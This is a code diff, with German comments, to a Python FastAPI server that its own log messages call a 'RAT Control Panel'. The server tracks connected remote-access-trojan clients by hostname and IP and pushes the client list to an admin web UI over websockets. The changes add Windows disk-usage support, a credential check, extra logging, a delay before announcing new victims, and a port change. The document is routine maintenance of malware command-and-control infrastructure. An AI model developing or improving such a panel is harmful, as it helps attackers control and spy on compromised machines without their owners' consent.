@@ -75,7 +75,12 @@ def get_server_stats():
     try:
         cpu_percent = psutil.cpu_percent(interval=1)
         memory = psutil.virtual_memory()
-        disk = psutil.disk_usage('/')
+        # Windows-kompatible Disk-Usage
+        import platform
+        if platform.system() == "Windows":
+            disk = psutil.disk_usage('C:')
+        else:
+            disk = psutil.disk_usage('/')
         
         return {
             "cpu_percent": cpu_percent,
@@ -96,6 +101,11 @@ def get_server_stats():
 
 # --- AUTH-FUNKTIONEN ---
 async def get_current_user(credentials: HTTPBasicCredentials = Depends(security)):
+    if not ADMIN_USERNAME or not ADMIN_PASSWORD:
+        raise HTTPException(
+            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
+            detail="Server-Konfigurationsfehler: Admin-Credentials nicht gesetzt"
+        )
     correct_username = secrets.compare_digest(credentials.username, ADMIN_USERNAME)
     correct_password = secrets.compare_digest(credentials.password, ADMIN_PASSWORD)
     if not (correct_username and correct_password):
@@ -294,6 +304,7 @@ async def websocket_endpoint(websocket: WebSocket):
     logging.info("Web-UI verbunden.")
     
     # Sende sofort die Client-Liste
+    logging.info(f"Sende Client-Liste an Web-UI. Anzahl Clients: {len(RAT_CLIENTS)}")
     await send_client_list()
     
     try:
@@ -415,6 +426,10 @@ async def send_client_list():
             "ip": client_info.get("ip", ""),
             "last_seen": client_info.get("last_seen", 0),
         })
+    
+    logging.info(f"Sending client list with {len(clients)} clients to {len(WEB_UI_SOCKETS)} web UI connections")
+    
+    # Sende an alle verbundenen Web-UIs
     await send_to_web_ui({"type": "client_list", "clients": clients})
 
 async def send_to_web_ui(data: dict):
@@ -473,6 +488,9 @@ async def rat_client_endpoint(websocket: WebSocket):
     
     logging.info(f"[+] Neuer RAT-Client verbunden: {hostname} ({remote_address})")
     
+    # Warte kurz bevor Client-Info gesendet wird
+    await asyncio.sleep(0.1)
+    
     await send_to_web_ui({
         "type": "client_connected",
         "client": {
@@ -483,6 +501,8 @@ async def rat_client_endpoint(websocket: WebSocket):
             "ip": ip,
         },
     })
+    
+    # Sende aktualisierte Client-Liste
     await send_client_list()
 
     try:
@@ -592,7 +612,7 @@ if __name__ == "__main__":
     # Initialize start time
     start_time = time.time()
     
-    port = int(os.getenv("PORT", 8000))
+    port = int(os.getenv("PORT", 8001))
     logging.info(f"Starting RAT Control Panel on port {port}")
     logging.info(f"Admin credentials: {ADMIN_USERNAME} / {'*' * len(ADMIN_PASSWORD)}")
     
